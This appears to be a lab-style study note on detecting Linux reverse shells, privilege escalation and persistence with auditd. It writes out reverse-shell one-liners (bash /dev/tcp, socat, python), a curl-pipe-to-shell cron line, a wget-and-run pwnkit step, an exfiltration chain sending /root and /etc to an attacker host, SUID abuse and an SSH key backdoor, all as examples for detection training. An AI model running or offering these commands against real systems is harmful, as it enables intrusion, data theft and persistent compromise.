# 🐚 Reverse Shells, Privilege Escalation & Persistence in Linux

Attackers accessing systems via **SSH** get a convenient, full-featured terminal with colors, autocompletion, and `Ctrl+C` support. However, not every breach grants such access. When **Initial Access** occurs through exploits or web vulnerabilities, attackers often face restrictions such as:

* Broken or delayed command output
* Network or execution timeouts
* Limited permissions or shell access

To overcome these issues, adversaries establish **reverse shells** — outbound connections from the victim machine to the attacker, allowing interactive control.

---

## 🔄 Reverse Shells

Here are a few common methods to spawn a reverse shell on Linux:

| **Victim Command**                                                     | **Explanation**                                                                                |
| ---------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------- |
| `bash -i >& /dev/tcp/10.10.10.10/1337 0>&1`                            | Forces the victim to connect to the attacker’s IP (`10.10.10.10:1337`) and spawn a Bash shell. |
| `socat TCP:10.20.20.20:2525 EXEC:'bash',pty,stderr,setsid,sigint,sane` | Uses **socat** to establish a reverse shell; the attacker listens at `10.20.20.20:2525`.       |
| `python3 -c '[...] s.connect(("10.30.30.30",80));pty.spawn("bash")'`   | Python alternative; the attacker listens on port `80`.                                         |

---

## 🕵️ Detecting Reverse Shells

Reverse shells are **critical alerts** — they indicate active exploitation and hands-on-keyboard activity. Fortunately, they are detectable using **auditd**.

### Example: Detecting a `socat` Reverse Shell

```bash
root@thm-vm:~$ ausearch -i -x socat
type=PROCTITLE msg=audit(09/19/25 17:42:10.903:406) : proctitle=socat TCP:10.20.20.20:2525 EXEC:'bash',[...]
type=SYSCALL msg=audit(09/19/25 17:42:10.903:406) : ppid=27806 pid=27808 auid=unset uid=serviceuser key=exec
```

You can reconstruct the process tree to trace the origin:

```bash
root@thm-vm:~$ ausearch -i --pid 27806
root@thm-vm:~$ ausearch -i --pid 27796
```

Once connected, attackers typically run **Discovery** commands:

```bash
root@thm-vm:~$ ausearch -i --ppid 27808 | grep proctitle
type=PROCTITLE msg=audit(...): proctitle=id
type=PROCTITLE msg=audit(...): proctitle=uname -a
type=PROCTITLE msg=audit(...): proctitle=ls -la .
```

---

## 🧱 Privilege Escalation Basics

Initial Access rarely grants **root** privileges. Attackers often need **Privilege Escalation** to gain administrative control.

| **Preceding Discovery (IF)**                     | **Privilege Escalation (THEN)**                                                 |       |
| ------------------------------------------------ | ------------------------------------------------------------------------------- | ----- |
| `uname -a` reveals an outdated Ubuntu 16.04      | Run an exploit like: `wget [http://bad.thm/pwnkit.sh](http://bad.thm/pwnkit.sh) | bash` |
| `find /bin -perm 4000` finds a SUID `env` binary | Abuse it: `/bin/env /bin/bash -p`                                               |       |
| `ls /etc/ssh` shows an unprotected backup key    | Use it: `ssh root@127.0.0.1 -i ssh-backup-key`                                  |       |

### Detection Strategy

Privilege Escalation detection is complex — focus on **surrounding indicators** rather than exact exploits.

Example attack chain:

```bash
# 1. Discovery
whoami
id; pwd; uname -r

# 2. Exploit Download
wget http://c2-server.thm/pwnkit.c -O /tmp/pwnkit.c
gcc /tmp/pwnkit.c -o /tmp/pwnkit
/tmp/pwnkit

# 3. Exfiltration
whoami      # Now 'root'
tar czf dump.tar.gz /root /etc/
scp dump.tar.gz attacker@c2-server.thm:~
```

You can confirm escalation by comparing UIDs before and after:

```bash
ausearch -i -x pwnkit
ausearch -i --ppid <pid> | grep uid=root
```

---

## 🔁 Persistence in Linux

Some attackers skip persistence if systems rarely reboot, but advanced adversaries establish long-term footholds through **cron jobs**, **systemd services**, or **SSH backdoors**.

### 🕓 Cron Persistence

Cron jobs act like Windows scheduled tasks — simple and reliable.

```bash
@reboot nohup /home/<user>/.<hidden>/<malware> > /dev/null 2>&1 &
```

Rocke cryptominer, for instance:

```bash
echo "*/10 * * * * root (curl https://pastebin.com/raw/1NtRkBc3 | sh)" > /etc/cron.d/root
```

### ⚙️ Systemd Persistence

Attackers can register malicious services:

```bash
[Unit]
Description=Initial cloud-online job
[Service]
ExecStart=/usr/bin/cloud-online
```

---

## 🧩 Detecting Persistence

Monitor both **file changes** and **process executions**:

| **Monitor Changes In** | **Paths**                                             |
| ---------------------- | ----------------------------------------------------- |
| Cron files             | `/etc/crontab`, `/etc/cron.d/*`, `/var/spool/cron/*`  |
| Systemd files          | `/lib/systemd/system/*`, `/etc/systemd/system/*`      |
| Related processes      | `crontab -e`, `systemctl enable`, `nano /etc/crontab` |

Example:

```bash
ausearch -i -f /etc/systemd
ausearch -i -x crontab
```

---

## 👤 Account Persistence

Attackers may add privileged users or inject SSH keys.

### New User Creation

```bash
cat /var/log/auth.log | grep -E 'useradd|usermod'
```

### SSH Key Backdoor

```bash
echo "AAAAC3Nza...IkiINvQt/R" >> ~/.ssh/authorized_keys
```

Detect via auditd file change monitoring:

```bash
ausearch -i -f ~/.ssh/authorized_keys
```

---

## 🌐 Application-Layer Persistence

For web apps (e.g. WordPress), attackers may upload **web shells** (like [WSO](https://www.wordfence.com/blog/2017/06/wso-shell)) to maintain access — invisible to auditd or system logs.

If malware keeps reappearing, investigate **application-level compromises**.

---

## 🎯 Targeted Attacks and Recap

* **Linux as an Entry Point:** Even one compromised Linux server can open the door to a full enterprise breach.
* **Espionage Use Cases:** State-sponsored APTs (e.g., Kimsuky, Sandworm) often target Linux with persistence via `systemd` or `cron`.
* **Ransomware Trend:** Linux ransomware is on the rise, especially targeting **hypervisors** like VMware ESXi ([Varonis example](https://www.varonis.com/blog/vmware-esxi-in-the-line-of-ransomware-fire#ransomware-payload)).

---

## 🧠 Threat Detection Recap

* Detect reverse shells (`socat`, `bash -i`, `python -c`)
* Track privilege escalation attempts (e.g. `pwnkit`, SUID abuse)
* Monitor persistence indicators (cron, systemd, SSH keys)
* Investigate anomalies using **auditd**, **auth logs**, and **network traffic**

<img width="1288" height="494" alt="image" src="https://github.com/user-attachments/assets/663e2a62-ebbc-411a-b0d7-205418868055" />

